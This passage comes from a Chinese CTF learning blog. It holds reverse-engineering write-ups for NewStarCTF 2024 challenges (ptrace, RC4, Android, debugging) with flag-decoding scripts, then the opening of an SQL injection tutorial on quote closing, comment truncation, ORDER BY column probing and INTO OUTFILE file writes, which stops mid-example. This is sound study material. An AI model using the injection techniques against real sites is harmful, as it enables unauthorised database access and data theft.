perror(<span class="hljs-string">&quot;fork&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    wait(stat_loc);<br>    ptrace(PTRACE_POKEDATA, addr, addr, <span class="hljs-number">3</span>);<br>    ptrace(PTRACE_CONT, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    wait(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<span class="hljs-comment">//子进程</span><br>    ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    execl(<span class="hljs-string">&quot;./son&quot;</span>, <span class="hljs-string">&quot;son&quot;</span>, &amp;s, <span class="hljs-number">0</span>); <span class="hljs-comment">//把 s 作为新进程的参数</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于<code>fork()</code>、<code>execl()</code> 函数：都是 Linux 中的进程控制函数</p><p><code>fork()</code>：创建新的进程，该进程几乎相当于当前进程的一个完全拷贝</p><p><code>execl()</code>：是函数族 <code>exec()</code> 之一，用来启动另外的进程以取代当前运行的进程</p><p><code>execl()</code> 四个参数</p><table><thead><tr><th>参数</th><th>变量类型</th><th>解释</th></tr></thead><tbody><tr><td>绝对路径</td><td>const char*</td><td>文件存储路径</td></tr><tr><td>标识符</td><td>const char*</td><td>大多数时候是文件名</td></tr><tr><td>参数</td><td>——</td><td>选项</td></tr><tr><td>NULL</td><td>——</td><td>NULL</td></tr></tbody></table><p>所以 <code>main()</code> 函数中流程：<code>fork()</code> 创建子进程，返回的 <code>pid</code> 就是 <code>v11</code>，<code>v11</code>&gt;0 为父进程，<code>v11=0</code> 为子进程，子进程中使用了 <code>execl()</code> 函数，启动当前目录下的 <code>son</code> 文件，传入 <code>s</code> 作为新进程的参数，这里的新进程替换掉之前的子进程，使自己变成子进程。</p><p>打开 <code>son.txt</code> 查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_600011AD</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+2h] [ebp-28h]</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> j; <span class="hljs-comment">// [esp+6h] [ebp-24h]</span><br>  <span class="hljs-type">char</span> *s; <span class="hljs-comment">// [esp+Ah] [ebp-20h]</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp+Eh] [ebp-1Ch]</span><br><br>  s = *(<span class="hljs-type">char</span> **)(a2 + <span class="hljs-number">4</span>);<br>  v6 = <span class="hljs-built_in">strlen</span>(s);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v6; ++i )<br>    byte_60004080[i] = ((<span class="hljs-type">int</span>)(<span class="hljs-type">unsigned</span> __int8)s[i] &gt;&gt; dword_60004040) | (s[i] &lt;&lt; (<span class="hljs-number">8</span> - dword_60004040));<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; v6; ++j )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( byte_60004080[j] != byte_60004020[j] )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is Wrong~&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is right~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 <code>s = *(char **)(a2 + 4)</code>，其实它就是指向 <code>father</code> 传入的 <code>s</code>。<code>execl</code> 执行的命令为 <code>./son s</code>，而对于 <code>son</code> 文件的主函数而言，第一个参数是 <code>a1</code> 表示执行命令参数的个数，这里就是 2，而后面的 <code>a2</code> 真实类型为 <code>const char*</code>，代表的就是命令的各个参数，所以这里的 <code>a2 + 4</code> 执行的就是第二个参数，也就是 <code>s</code>.</p><p><img src="https://img.dkdun.cn/v1/2024/12/d178e014557fc4c8.png"></p><p>大概流程为：将 <code>s</code> 中的每个字节循环移位来进行变化，最后与密文进行比较</p><p>对于 <code>father</code> 文件的 <code>ptarce</code>，<code>ptrace</code> 是用于进程跟踪的，它提供了父进程可以观察和控制其子进程执行的能力，并允许父进程检查和替换子进程的内核镜像(包括寄存器)的值。其基本原理是: 当使用了<code>ptrace</code>跟踪后，所有发送给被跟踪的子进程的信号(除了<code>SIGKILL</code>)，都会被转发给父进程，而子进程则会被阻塞，这时子进程的状态就会被系统标注为<code>TASK_TRACED</code>。而父进程收到信号后，就可以对停止下来的子进程进行检查和修改，然后让子进程继续运行。   </p><p>而这里查看子进程，可以发现使用 <code>ptrace(PTRACE_TRACEME, 0, 0, 0);</code>，它就是允许父进程对自身进行调试的语句，然后在父进程中，使用  <code>PTRACE_POKEDATA</code>  对数据进行修改，然后使用  <code>PTRACE_CONT</code>  让子进程继续执行。因此我们要关注的就是父进程对子进程的什么数据进行了修改</p><p>我们能看到有语句<code>ptrace(PTRACE_POKEDATA, addr, addr, 3);</code>，就是将 <code>addr</code> 所指向的地址进行了数据修改，更改为了 <code>3</code>，点进去 <code>addr</code> 指向的就是 <code>0x60004040</code> 位置的数据</p><p><img src="https://img.dkdun.cn/v1/2024/12/671a98df4e205869.png"></p><p>这个地址在 <code>son</code> 文件中也出现了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v6; ++i )<br>  byte_60004080[i] = ((<span class="hljs-type">int</span>)(<span class="hljs-type">unsigned</span> __int8)s[i] &gt;&gt; dword_60004040) | (s[i] &lt;&lt; (<span class="hljs-number">8</span> - dword_60004040));<br></code></pre></td></tr></table></figure><p>所以这个 <code>ptrace</code> 修改的是偏移值，将 4 改为了 3</p><p><img src="https://img.dkdun.cn/v1/2024/12/8470274afc084d5c.png"></p><p>因此，按照偏移 3 进行逆向变换，脚本</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">enc = [<span class="hljs-number">0xCC</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xED</span>,<br>       <span class="hljs-number">0xAE</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x6D</span>,<br>       <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xAC</span>,<br>       <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xAF</span>]<br>for i <span class="hljs-keyword">in</span> range(len(enc)):<br>    enc[i] = (enc[i] &lt;&lt; <span class="hljs-number">3</span> | enc[i] &gt;&gt; <span class="hljs-number">5</span>)&amp;<span class="hljs-number">0xff</span><br>    print(chr(enc[i]), end=<span class="hljs-string">&#x27;&#x27;)</span><br></code></pre></td></tr></table></figure><h1 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h1><p>看了下 wp 需要脱壳，但是我拿到的附件已经是脱好壳的了，所以直接看伪代码</p><p>一般进行 upx 脱壳方法</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">upx</span> -d <span class="hljs-string">&quot;文件路径&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> status; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input your flag:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%22s&quot;</span>, s);<br>  RC4(s, key);<br>  <span class="hljs-keyword">for</span> ( status = <span class="hljs-number">0</span>; status &lt;= <span class="hljs-number">21</span>; ++status )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( s[status] != data[status] )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is Wrong~&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(status);<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is right~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>输入的字符串长度为 <code>22</code>，然后进入 <code>RC4</code> 函数加密，后续进行 <code>for</code> 循环中，把<code>s</code> 和 <code>data</code> 进行比较</p><p>RC4 函数内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">RC4</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1, __int64 a2)</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> __int8 v3; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int8 v4; <span class="hljs-comment">// [rsp+15h] [rbp-Bh]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  v3 = <span class="hljs-number">0</span>;<br>  v4 = <span class="hljs-number">0</span>;<br>  init_sbox(a2);<br>  v6 = <span class="hljs-built_in">strlen</span>(a1);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    result = i;<br>    <span class="hljs-keyword">if</span> ( i &gt;= v6 )<br>      <span class="hljs-keyword">break</span>;<br>    v4 += sbox[++v3];<br>    swap(&amp;sbox[v3], &amp;sbox[v4]);<br>    a1[i] ^= sbox[(<span class="hljs-type">unsigned</span> __int8)(sbox[v3] + sbox[v4])];<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>RC4 加密，好讨厌写解密算法。。。</p><p>看 wp 可以进行动调，又学到了，直接下断点</p><p><img src="https://img.dkdun.cn/v1/2024/12/0ed96784483aba17.png"></p><p>这是 <code>elf</code> 文件，所以只能远程动调，连接 kali</p><p><img src="https://img.dkdun.cn/v1/2024/12/30ea914294d8ad9b.png"></p><p>随便输入字符串，断点断在了加密函数，查看数据就是我们输入的字符串</p><p>然后找到 <code>data</code> ，把数据提取出来</p><p><img src="https://img.dkdun.cn/v1/2024/12/0b7d89f3556bbcf9.png"></p><p><img src="https://img.dkdun.cn/v1/2024/12/4b329403b9e95b5f.png"></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">from ida_bytes import *<br>addr = <span class="hljs-number">0x55FE34CF0040</span>//s的起始地址<br>enc = [<span class="hljs-number">0xC4</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x10</span>,<br>       <span class="hljs-number">0x56</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x9C</span>,<br>       <span class="hljs-number">0x75</span>, <span class="hljs-number">0xB5</span>]<br>for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">22</span>):<br>    patch_byte(addr + i, enc[i])<br>print(<span class="hljs-string">&#x27;Done&#x27;</span>)<br></code></pre></td></tr></table></figure><p>点进 <code>run</code> 之后，s 就会有变化，然后 f9 运行又会断在与 <code>data</code> 比较的地方，这个时候可以看 <code>s</code> 的值，与之前又不一样，按 <code>a</code> 可以转化为字符串（又学到了！）</p><p><img src="https://img.dkdun.cn/v1/2024/12/ced081c112845bbe.png"> </p><p>over~</p>]]></content>
    
    
    <categories>
      
      <category>只关于 Reverse</category>
      
      <category>赛题复现</category>
      
      <category>NewStarCTF 2024</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2024 Week1</title>
    <link href="/2024/11/11/%E5%A4%8D%E7%8E%B01/"/>
    <url>/2024/11/11/%E5%A4%8D%E7%8E%B01/</url>
    
    <content type="html"><![CDATA[<p>复现复现！猫猫虫真可爱捏 :)</p><span id="more"></span><h1 id="Simple-encryption"><a href="#Simple-encryption" class="headerlink" title="Simple_encryption"></a>Simple_encryption</h1><p>ida 打开</p><p><img src="https://img.dkdun.cn/v1/2024/12/45aba7af131703c1.png"></p><p>主要逻辑是根据输入的字符串长度，如果<code>j%3==0</code> ，那么就将输入的索引为<code>j</code> 的值减去 <code>31</code>，如果 <code>j%3==1</code>，加上<code>41</code>,如果 <code>j%3==2</code>，那么和 <code>0x55</code> 异或。然后值与 <code>buffer</code> 数组相比较，一样就成功，所以点进数组提取数据。</p><p><img src="https://img.dkdun.cn/v1/2024/12/71cd4fc66d472b65.png"></p><p>可以写出 python 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">buffer = [<span class="hljs-number">0x47</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x16</span>,<br>          <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x5C</span>,<br>          <span class="hljs-number">0x07</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x28</span>,<br>          <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(buffer)):<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">0</span>:<br>        buffer[i] += <span class="hljs-number">0x1f</span><br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">1</span>:<br>        buffer[i] -= <span class="hljs-number">0x29</span><br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">2</span>:<br>        buffer[i] ^= <span class="hljs-number">0x55</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(buffer[i]), end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="ezAndroidStudy"><a href="#ezAndroidStudy" class="headerlink" title="ezAndroidStudy"></a>ezAndroidStudy</h1><p>我记得之前在哪个师傅博客看到过说先看 <code>.xml</code> 文件的 <code>activity</code> 可以快速找到。</p><p>对于 apk 文件可以先拖进模拟器运行看看里面是什么样的，然后看看提示</p><p><img src="https://img.dkdun.cn/v1/2024/12/1225907047cea4d6.png"></p><p>所以查看 <code>AndroidManifest.xml</code>，看见 <code>activity</code> 只有 <code>work.pangbai.ezandroidstudy.Homo</code> 和 <code>work.pangbai.ezandroidstudy.MainActivity</code></p><p><img src="https://img.dkdun.cn/v1/2024/12/8cdfab6774a6a8c5.png"></p><p>拿到 flag1</p><p><img src="https://img.dkdun.cn/v1/2024/12/51ac9c9e7e71f1e9.png"></p><p>看下一个</p><p><img src="https://img.dkdun.cn/v1/2024/12/f1ca7ebb6f9da41c.png"></p><p>在 <code>resources.arsc/res/value/string.xml</code> 找到了</p><p><img src="https://img.dkdun.cn/v1/2024/12/cdf9036f6f299c85.png"></p><p>继续看下一个</p><p><img src="https://img.dkdun.cn/v1/2024/12/fd4cd1392593c483.png"></p><p><code>/layout/activity_main.xml</code> 里的 <code>activity_main.xml</code></p><p><img src="https://img.dkdun.cn/v1/2024/12/8fb3d0ba6b81c630.png"></p><p>查找 flag4</p><p><img src="https://img.dkdun.cn/v1/2024/12/fd86d0f76ba83a70.png"></p><p>打开 <code>/res/raw</code> 发现目录下有个 <code>flag4.txt</code></p><p><img src="https://img.dkdun.cn/v1/2024/12/bbfa8ee63b0b9c03.png"></p><p>flag 5</p><p><img src="https://img.dkdun.cn/v1/2024/12/6f609d03f4d2cc66.png"></p><p>需要逆向 so 层，那么将 <code>.so</code> 提取出来，可以使用<code>apktool</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">apktool</span> d ezAndroidStudy.apk -o <span class="hljs-string">&quot;需要生成的文件夹&quot;</span><br></code></pre></td></tr></table></figure><p> 将<code>&quot;/lib/x86_64/libezandroidstudy.so&quot;</code>丢进 ida 反编译就出来了</p><p><img src="https://img.dkdun.cn/v1/2024/12/94ea73f36dd81624.png"></p><h1 id="ez-debug"><a href="#ez-debug" class="headerlink" title="ez_debug"></a>ez_debug</h1><p>根据题目丢进 <code>x64dbg</code> 动调</p><p>首先查找字符串，看看有没有可以字符串，可以发现有一些 <code>flag</code> 字样</p><p><img src="https://img.dkdun.cn/v1/2024/12/c4ab9716a8f2bb1b.png"></p><p>在 <code>Decrypted flag</code> 处下个断点运行，得到结果</p><p><img src="https://img.dkdun.cn/v1/2024/12/be3f66141d6c7ac6.png"></p><p><img src="https://img.dkdun.cn/v1/2024/12/42e30da474972b02.png"></p><p>太喜欢逆向了有种做不出来但又想做的崩溃感</p>]]></content>
    
    
    <categories>
      
      <category>只关于 Reverse</category>
      
      <category>赛题复现</category>
      
      <category>NewStarCTF 2024</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入</title>
    <link href="/2024/11/10/SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/11/10/SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>以前一直搞不太懂 SQL 注入的一些东西，不知道为什么要加单引号或双引号，为什么有时候用 and 但有时候又用 or，最近看了一些 SQL 注入知识点，所以总结一些 qwq</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>寻找功能点进行测试，达到非预期执行数据库语句</p><p>比如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = butt3rf1y;<br></code></pre></td></tr></table></figure><p>一般在以下地方容易存在注入点：</p><p>URL参数：例如在查询字符串或路径中</p><p>表单输入：应用程序中的表单输入框，如用户名、密码、搜索框等，如果没有进行充分的输入验证和过滤，就可能成为 SQL 注入的目标</p><p>Cookie：如果应用程序使用 Cookie 来存储用户信息或会话状态，可以通过修改 Cookie 中的值来进行 SQL 注入</p><p>HTTP头部：有些应用程序可能会从 HTTP 头部中获取数据，可以在 HTTP 头部中进行 SQL 注入</p><p>数据库查询语句：如果有源码，直接进行代码审计，可能有直接拼接 SQL 查询语句的地方，存在 SQL 注入</p><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p><img src="/SQLschema.png"></p><p>如上图，数据库的结构为</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript">+数据库 <span class="hljs-function"><span class="hljs-params">(database)</span>--&gt;</span>ctf_database<br>+ - 表_user <span class="hljs-function"><span class="hljs-params">(table_user)</span>--&gt;</span>user<br>+ - 表_users <span class="hljs-function"><span class="hljs-params">(table_users)</span>--&gt;</span>users<br>+ + - 列_id <span class="hljs-function"><span class="hljs-params">(column_id)</span>--&gt;</span>id<br>+ + - 列_username <span class="hljs-function"><span class="hljs-params">(column_username)</span>--&gt;</span>username<br>+ + - 列_password <span class="hljs-function"><span class="hljs-params">(column_password)</span>--&gt;</span>password<br>+ + + - 数据<br>+ + + - 数据<br></code></pre></td></tr></table></figure><h2 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h2><p><code>SECLECT</code></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> 列名<span class="hljs-number">1</span>, 列名<span class="hljs-number">2</span>, ... <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> 条件<br></code></pre></td></tr></table></figure><p><code>UNION</code></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> 列名<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> 表名<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> 列名<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> 表名<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>使用 <code>union</code> 的时候两个表列数必须相同</p><p><code>Order by</code></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> column1, column2, ... <span class="hljs-keyword">from</span> table_name [<span class="hljs-keyword">where</span> condition] <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> column_name<br></code></pre></td></tr></table></figure><p>一般用来判断列数，比如说</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs s">select column1，column2 from table_name order by 1;//不报错<br>select column1，column2 from table_name order by 2;//不报错<br>select column1，column2 from table_name order by 3;//报错<br>//说明只有2列<br></code></pre></td></tr></table></figure><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><p><code>user()</code>：当前数据库用户</p><p><code>database()</code>：当前数据库名</p><p><code>concat()</code>：联合数据，用于联合两条数据。比如 <code>concat(username,0x30,password)</code> 将 <code>username</code> 和 <code>password</code> 通过 <code>:</code> 连接起来</p><p><code>group_concat</code>：和 <code>concat</code> 类似，用于把多条数据一次注入出来</p><p><code>select xxoo into outfile &#39;路径&#39;</code>：权限较高时可直接写文件</p><h1 id="基本注入类型"><a href="#基本注入类型" class="headerlink" title="基本注入类型"></a>基本注入类型</h1><h2 id="注入类型判断"><a href="#注入类型判断" class="headerlink" title="注入类型判断"></a>注入类型判断</h2><p>SQL 处理语句后台的写法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = ?<br></code></pre></td></tr></table></figure><p><code>?</code> 这里有多种闭合方式，比如:<code>$id</code>，<code>&#39;$id&#39;</code>，<code>“$id”</code>，<code>($id)</code></p><p>然后<strong>构造闭合</strong>，其实这个词我也不太懂，看了一下探姬师傅的 hello-ctf 上的解释，是这样的：</p><p>比如后台为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$id</span>&quot;</span><br></code></pre></td></tr></table></figure><p>那么我们使传入的 <code>$id=&#39;1&quot;&#39;</code> ，后台执行则为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;1&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>在这里对 <code>1</code> 完成了闭合构造，但是闭合了前序导致后续的 <code>&quot;</code> 没有双引号配对，多出来的这个双引号就会导致报错：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1064 </span>- You have an <span class="hljs-keyword">error</span> in your SQL syntax; check the manual that corresponds <span class="hljs-keyword">to</span> your MySQL server version <span class="hljs-keyword">for</span> the right syntax <span class="hljs-keyword">to</span> use near <span class="hljs-comment">&#x27;&quot;&#x27; at line 1</span><br></code></pre></td></tr></table></figure><p>所以通常在构造完闭合后去注释掉后面的符号，比如使用 <code>#</code>,<code>--</code></p><h3 id="是否报错判断"><a href="#是否报错判断" class="headerlink" title="是否报错判断"></a>是否报错判断</h3><p><code>&quot;1&#39;&quot;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1&#x27;&quot;</span><br>// <span class="hljs-string">&quot;&quot;</span> 中为可以包含 <span class="hljs-string">&#x27;,而 